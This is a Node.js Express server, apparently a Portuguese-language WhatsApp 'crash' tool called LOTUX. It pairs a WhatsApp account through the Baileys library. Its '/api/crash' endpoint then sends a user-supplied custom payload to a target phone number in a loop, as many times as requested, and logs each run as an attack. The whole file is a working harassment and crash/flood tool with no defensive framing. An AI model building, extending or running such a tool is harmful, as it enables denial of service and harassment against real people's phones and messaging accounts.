const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const https = require('https');
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');

const app = express();
app.use(express.json());
app.use(express.static(__dirname)); // Serve o index.html na raiz

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

let waSock = null;
let connectionStatus = "DESCONECTADO";
let pairingCodeCache = null;
let reconectando = false;

// Servir o painel web principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API para iniciar a sessão e solicitar o código de emparelhamento pelo número digitado no app
app.post('/api/connect', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, error: "Número não informado." });
    }

    try {
        const numeroLimpo = phoneNumber.replace(/\D/g, '');
        iniciarWhatsApp(numeroLimpo);
        res.json({ success: true, message: "Conexão solicitada com sucesso." });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// API para o frontend verificar o status e o código de emparelhamento em tempo real
app.get('/api/status', (req, res) => {
    res.json({ 
        status: connectionStatus, 
        pairingCode: pairingCodeCache 
    });
});

// API para disparar o script JSON personalizado configurado na engrenagem para o alvo
app.post('/api/crash', async (req, res) => {
    const { target, qty, payload } = req.body;
    
    if (!waSock || connectionStatus !== "CONECTADO") {
        return res.status(400).json({ success: false, error: "WhatsApp não está conectado." });
    }

    try {
        const alvoNum = target.replace(/\D/g, '');
        const jidAlvo = `${alvoNum}@s.whatsapp.net`;
        const quantidade = parseInt(qty) || 1;

        console.log(`[ATTACK] Disparando payload customizado para ${alvoNum} (${quantidade}x)`);

        for (let i = 1; i <= quantidade; i++) {
            // Envia o payload exato configurado na engrenagem pelo Baileys
            await waSock.relayMessage(jidAlvo, payload, { participant: { jid: jidAlvo } });
            await delay(700);
        }

        res.json({ success: true, message: "Disparos efetuados com sucesso!" });
    } catch (e) {
        console.error("Erro ao enviar payload:", e);
        res.status(500).json({ success: false, error: e.message });
    }
});

// Função de Conexão do WhatsApp via Baileys
async function iniciarWhatsApp(numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_whatsapp');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'close') {
            connectionStatus = "DESCONECTADO";
            pairingCodeCache = null;
            reconectando = false;
            setTimeout(() => iniciarWhatsApp(numeroTelefone), 5000);
        } else if (connection === 'open') {
            connectionStatus = "CONECTADO";
            pairingCodeCache = null;
            reconectando = false;
            console.log("WhatsApp conectado com sucesso (LOTUX)!");
        }
    });

    // Solicitar Código de Emparelhamento caso não esteja registrado
    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            pairingCodeCache = codigo;
            console.log(`Código de Emparelhamento Gerado: ${codigo}`);
        } catch (error) {
            console.error("Erro ao gerar código de emparelhamento:", error);
        }
    }
}

server.listen(PORT, () => {
    console.log(`Servidor LOTUX rodando na porta ${PORT}`);
});
